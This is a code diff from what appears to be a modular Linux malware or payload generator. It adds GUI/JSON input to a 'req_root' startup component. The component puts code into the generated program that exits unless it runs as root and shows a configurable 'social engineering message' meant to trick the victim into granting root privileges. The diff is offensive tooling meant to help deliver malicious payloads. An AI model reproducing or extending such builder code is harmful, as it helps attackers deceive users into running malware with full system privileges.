@@ -5,25 +5,34 @@ config.main()
 interface = config.interface
 if interface == "GUI":
     from flask import jsonify
+    from json import loads
 
 
 
-def main(option):
+def main(option, prompt = None):
     if option == 'generate':
         config.import_statements.append('import os')
         config.startup.append('req_root_startup()')
-        print(config.war + 'Manual intervention required for req_root startup component')
-        message = input('\x1b[1m\x1b[37m[\x1b[0m\033[92m' +
-                            '\x1b[1m\x1b[31mlinux/startup/req_root\x1b[0m' +
-                            '\x1b[1m\x1b[37m > ]\x1b[0m ' + 'Social engineering message to display to the user to request for root [Enter for default message] : ')
-        if not message:
-            message = 'ERROR - This file must be run as root to work'
+        if interface == "GUI":
+            conditions = loads(prompt)
+            if (conditions['request_root_message'] == ''):
+                message = 'ERROR - This file must be run as root to work'
+            else:
+                message = str(conditions['request_root_message'])
+            config.app.logger.info("[components/linux/startup/req_root] - Set startup message to \"" + message + "\"")
+        elif interface == "CUI":
+            print(config.war + 'Manual intervention required for req_root startup component')
+            message = input('\x1b[1m\x1b[37m[\x1b[0m\033[92m' +
+                                '\x1b[1m\x1b[31mlinux/startup/req_root\x1b[0m' +
+                                '\x1b[1m\x1b[37m > ]\x1b[0m ' + 'Social engineering message to display to the user to request for root [Enter for default message] : ')
+            if not message:
+                message = 'ERROR - This file must be run as root to work'
         config.functions.append('''
 def req_root_startup():
     if os.getuid() == 0:
         return
     else:
-        print ("''' + message + '''")
+        print ("""''' + message + '''""")
         exit()
 ''')
     elif option == 'info':
